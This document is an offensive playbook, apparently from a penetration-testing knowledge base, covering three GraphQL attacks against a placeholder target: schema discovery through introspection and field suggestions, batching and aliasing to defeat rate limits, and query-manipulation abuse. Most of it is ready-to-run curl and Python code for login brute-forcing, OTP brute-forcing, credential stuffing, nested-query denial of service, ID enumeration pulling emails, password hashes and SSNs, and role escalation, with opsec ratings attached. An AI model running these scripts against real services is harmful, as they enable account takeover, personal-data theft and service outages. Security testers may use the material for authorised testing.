# Web – GraphQL Attacks

### GraphQL Introspection Query [added: 2026-04]
- **Tags:** #GraphQL #Introspection #SchemaDiscovery #Recon #APIEnumeration #OWASPA1 #InformationDisclosure #graphql-voyager #clairvoyance
- **Trigger:** Application exposes a GraphQL endpoint (typically `/graphql`, `/api/graphql`, `/gql`, `/v1/graphql`) — detected via path scanning, JavaScript source review showing GraphQL queries, or error messages containing "GraphQL" or "query syntax error"
- **Prereq:** Access to a GraphQL endpoint + introspection not disabled (default is enabled in most GraphQL implementations) + ability to send POST requests with JSON body or GET requests with query parameter
- **Yields:** Full API schema dump — all types, fields, queries, mutations, subscriptions, and their argument structures. This is the equivalent of finding complete API documentation and reveals every possible operation, including admin-only mutations and hidden fields
- **Opsec:** Low
- **Context:** GraphQL introspection is enabled by default in most implementations (Apollo, graphql-yoga, Hasura, etc.) and is the first thing to test when you find a GraphQL endpoint. The schema reveals the entire API surface: queries for data retrieval, mutations for modification, and their exact parameter structures. Even if the app's UI only uses a subset of the schema, the full API is accessible. Look for admin mutations, internal fields, and sensitive types that the front-end doesn't expose.
- **Payload/Method:**
```bash
# Step 1: Discover the GraphQL endpoint
# Common paths to try:
for path in /graphql /graphiql /api/graphql /api/v1/graphql /gql /query /playground; do
  code=$(curl -s -o /dev/null -w "%{http_code}" "http://target${path}" -X POST \
    -H "Content-Type: application/json" -d '{"query":"{__typename}"}')
  echo "${path}: ${code}"
done

# Step 2: Full introspection query (dumps entire schema)
curl -s "http://target/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"query IntrospectionQuery{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}"}'  | python3 -m json.tool > schema.json

# Step 3: Extract key information from the schema
# List all queries:
python3 -c "
import json
schema = json.load(open('schema.json'))
types = {t['name']: t for t in schema['data']['__schema']['types']}
query_type = schema['data']['__schema']['queryType']['name']
for field in types[query_type]['fields']:
    args = ', '.join([f\"{a['name']}: {a['type']['name'] or a['type']['kind']}\" for a in field['args']])
    print(f\"  {field['name']}({args})\")
"

# List all mutations:
python3 -c "
import json
schema = json.load(open('schema.json'))
types = {t['name']: t for t in schema['data']['__schema']['types']}
mut_type = schema['data']['__schema'].get('mutationType')
if mut_type:
    for field in types[mut_type['name']]['fields']:
        args = ', '.join([f\"{a['name']}: {a['type']['name'] or a['type']['kind']}\" for a in field['args']])
        print(f\"  {field['name']}({args})\")
"

# Step 4: Visualize with graphql-voyager (browser-based)
# Copy schema.json content to: https://graphql-kit.com/graphql-voyager/
# Or use InQL Burp extension for automated analysis

# Step 5: If introspection is disabled, try field suggestion abuse
curl -s "http://target/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{__typ}"}'
# Error may suggest: "Did you mean __type or __typename?"
# Use clairvoyance for automated wordlist-based schema recovery:
# https://github.com/nikitastupin/clairvoyance
clairvoyance -o recovered_schema.json http://target/graphql

# Step 6: Try GET-based introspection (some WAFs only filter POST)
curl -s "http://target/graphql?query={__schema{types{name,fields{name}}}}"
```

### GraphQL Batching Attack [added: 2026-04]
- **Tags:** #GraphQL #Batching #RateLimitBypass #BruteForce #OTP #CredentialStuffing #OWASPA7 #QueryBatching #Aliasing #Authentication
- **Trigger:** GraphQL endpoint accepts batched queries (array of operations in a single request) or supports query aliasing — this allows sending hundreds of operations in one HTTP request, bypassing per-request rate limiting
- **Prereq:** GraphQL endpoint that supports query batching (most do by default) or aliasing + a brute-forceable target (login, OTP verification, password reset token) + knowledge of the mutation/query structure from introspection
- **Yields:** Rate limit bypass for brute force attacks — send thousands of login attempts, OTP guesses, or credential stuffing operations in a single HTTP request, evading WAF and application-level rate limiting
- **Opsec:** Med
- **Context:** Most GraphQL implementations accept an array of queries in a single POST request. Rate limiting typically counts HTTP requests, not individual GraphQL operations within a batch. This means you can send 1000 login attempts in a single request and it counts as 1 request for rate limiting purposes. Aliasing achieves the same within a single query by duplicating operations with different aliases. This is devastating against OTP verification (6-digit = 1M combinations, batchable in ~1000 requests).
- **Payload/Method:**
```bash
# Step 1: Test if batching is supported
curl -s "http://target/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '[{"query":"{__typename}"},{"query":"{__typename}"}]'
# If both return results, batching is supported

# Step 2: Brute force login via batching (array method)
python3 << 'PYEOF'
import json
import requests

target = "http://target/graphql"
username = "admin"
passwords = ["password", "admin123", "letmein", "Welcome1", "P@ssw0rd"]

# Build batch of login mutations
batch = []
for i, pwd in enumerate(passwords):
    batch.append({
        "query": f'mutation {{ login(username: "{username}", password: "{pwd}") {{ token success }} }}'
    })

resp = requests.post(target, json=batch, headers={"Content-Type": "application/json"})
for i, result in enumerate(resp.json()):
    if result.get('data', {}).get('login', {}).get('success'):
        print(f"[+] Valid password: {passwords[i]}")
    else:
        print(f"[-] Failed: {passwords[i]}")
PYEOF

# Step 3: Brute force OTP via aliasing (single query, multiple operations)
python3 << 'PYEOF'
import requests

target = "http://target/graphql"

# Generate aliased queries for OTP brute force (e.g., 4-digit OTP)
aliases = []
for otp in range(0, 1000):  # 0000-0999 in one request
    otp_str = f"{otp:04d}"
    aliases.append(f'  attempt_{otp}: verifyOTP(code: "{otp_str}") {{ success token }}')

query = "mutation {\n" + "\n".join(aliases) + "\n}"

resp = requests.post(target, json={"query": query}, headers={"Content-Type": "application/json"})
data = resp.json().get('data', {})
for key, val in data.items():
    if val and val.get('success'):
        print(f"[+] Valid OTP found: {key} → {val}")
        break
PYEOF

# Step 4: Credential stuffing via batching
python3 << 'PYEOF'
import requests

target = "http://target/graphql"

# Load credential pairs from a file
creds = [
    ("user1@test.com", "password123"),
    ("user2@test.com", "admin123"),
    ("admin@company.com", "Welcome1"),
]

batch = []
for email, password in creds:
    batch.append({
        "query": f'mutation {{ login(email: "{email}", password: "{password}") {{ success token user {{ role }} }} }}'
    })

# Send all at once — counts as 1 HTTP request for rate limiting
resp = requests.post(target, json=batch, headers={"Content-Type": "application/json"})
for i, result in enumerate(resp.json()):
    login_data = result.get('data', {}).get('login', {})
    if login_data and login_data.get('success'):
        print(f"[+] Valid: {creds[i][0]}:{creds[i][1]} → token: {login_data.get('token')}")
PYEOF

# Step 5: Test batch size limits
# Some implementations limit batch size — find the threshold:
python3 -c "
import json
batch = [{'query':'{__typename}'} for _ in range(100)]
print(json.dumps(batch))
" | curl -s -X POST "http://target/graphql" -H "Content-Type: application/json" -d @- | python3 -c "
import sys, json
data = json.load(sys.stdin)
print(f'Accepted {len(data)} operations in one batch')
"
```

### GraphQL Injection / Query Manipulation [added: 2026-04]
- **Tags:** #GraphQL #Injection #NestedQuery #DoS #IDOR #AuthorizationBypass #OWASPA1 #OWASPA4 #FieldSuggestion #QueryDepth #ResourceExhaustion
- **Trigger:** GraphQL endpoint allows deep or circular query nesting (type A has field of type B which has field of type A), or resolvers do not enforce authorization per-field (IDOR via direct object access through GraphQL queries)
- **Prereq:** GraphQL endpoint accessible + schema knowledge (from introspection or field suggestions) + no query depth limiting or query cost analysis configured + for IDOR: ability to guess or enumerate object IDs
- **Yields:** Denial of service via resource exhaustion (nested query bomb), unauthorized data access via IDOR through GraphQL resolvers, information disclosure via field suggestions when introspection is disabled
- **Opsec:** Med
- **Context:** GraphQL's flexibility is also its weakness. Nested queries can create exponential server load (query A objects, each with B objects, each with A objects again). Missing per-field authorization means that even if the UI restricts what you see, you can directly query any field or object by ID. When introspection is disabled, sending malformed queries often triggers field suggestions that reveal the schema piece by piece.
- **Payload/Method:**
```bash
# Step 1: Nested query DoS (query bomb / circular references)
# If User has posts and Post has author (circular):
curl -s "http://target/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ users { posts { author { posts { author { posts { author { posts { author { name } } } } } } } } } }"}'
# Each level multiplies the load exponentially

# Step 2: Deep nesting payload generator
python3 << 'PYEOF'
depth = 20  # Adjust based on target
inner = "name"
for i in range(depth):
    if i % 2 == 0:
        inner = f"posts {{ author {{ {inner} }} }}"
    else:
        inner = f"author {{ posts {{ {inner} }} }}"
query = f"{{ users {{ {inner} }} }}"
print(query)
PYEOF

# Step 3: IDOR via direct object access
# Query another user's data by ID:
curl -s "http://target/graphql" -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_TOKEN" \
  -d '{"query":"{ user(id: 1) { email, password_hash, ssn, creditCard, role } }"}'

# Enumerate users:
for id in $(seq 1 100); do
  result=$(curl -s "http://target/graphql" -X POST \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer YOUR_TOKEN" \
    -d "{\"query\":\"{ user(id: ${id}) { id email role } }\"}")
  echo "ID ${id}: ${result}" | grep -v "null"
done

# Step 4: Access admin-only mutations with regular user token
# Found via introspection: mutation { deleteUser(id: 1) { success } }
curl -s "http://target/graphql" -X POST \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer REGULAR_USER_TOKEN" \
  -d '{"query":"mutation { updateUserRole(userId: 1, role: \"admin\") { success } }"}'

# Step 5: Field suggestion abuse (schema recovery when introspection is disabled)
# Send queries with typos to trigger suggestions:
curl -s "http://target/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ use }"}'
# Error: "Cannot query field 'use'. Did you mean 'user', 'users'?"

# Automate with clairvoyance:
pip install clairvoyance
clairvoyance http://target/graphql -o schema.json -w /path/to/wordlist.txt

# Step 6: Query cost / complexity bypass
# If depth limiting is in place, use fragments to flatten:
curl -s "http://target/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"query { ...F } fragment F on Query { users { ...U } } fragment U on User { posts { title body author { name email } } }"}'

# Step 7: Directive abuse (some implementations expose @include/@skip for logic manipulation)
curl -s "http://target/graphql" -X POST \
  -H "Content-Type: application/json" \
  -d '{"query":"{ user(id: 1) { email role sensitiveField @include(if: true) } }"}'
```
